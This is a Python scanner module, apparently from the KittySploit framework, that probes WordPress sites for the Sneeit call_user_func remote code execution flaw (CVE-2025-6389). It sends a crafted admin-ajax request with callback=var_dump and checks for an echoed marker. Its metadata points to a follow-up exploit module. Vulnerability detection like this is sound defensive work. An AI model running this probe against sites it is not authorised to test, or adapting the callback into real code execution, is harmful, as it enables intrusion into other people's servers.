#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sneeit Framework call_user_func RCE probe (CVE-2025-6389)."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Sneeit CVE-2025-6389 RCE detect",
        "description": (
            "Detects CVE-2025-6389 via admin-ajax sneeit_articles_pagination with callback=var_dump "
            "and a random marker echoed in the response."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-6389",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-6389",
            "https://github.com/Nxploited/CVE-2025-6389",
        ],
        "modules": ["exploits/multi/http/sneeit_cve_2025_6389_rce"],
        "tags": ["web", "scanner", "wordpress", "sneeit", "rce", "cve-2025-6389"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "produces": ["risk_signals", "exploit_paths"],
            "chain": {"suggested_followups": ["exploits/multi/http/sneeit_cve_2025_6389_rce"]},
        },
    }

    def run(self):
        marker = secrets.token_hex(6)
        data = f"action=sneeit_articles_pagination&callback=var_dump&args=%5B%22{marker}%22%5D"
        r = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        if "array(1)" in body and marker in body:
            self.set_info(
                severity="critical",
                reason="CVE-2025-6389 — call_user_func callback execution confirmed",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-6389",
            )
            return True
        return False
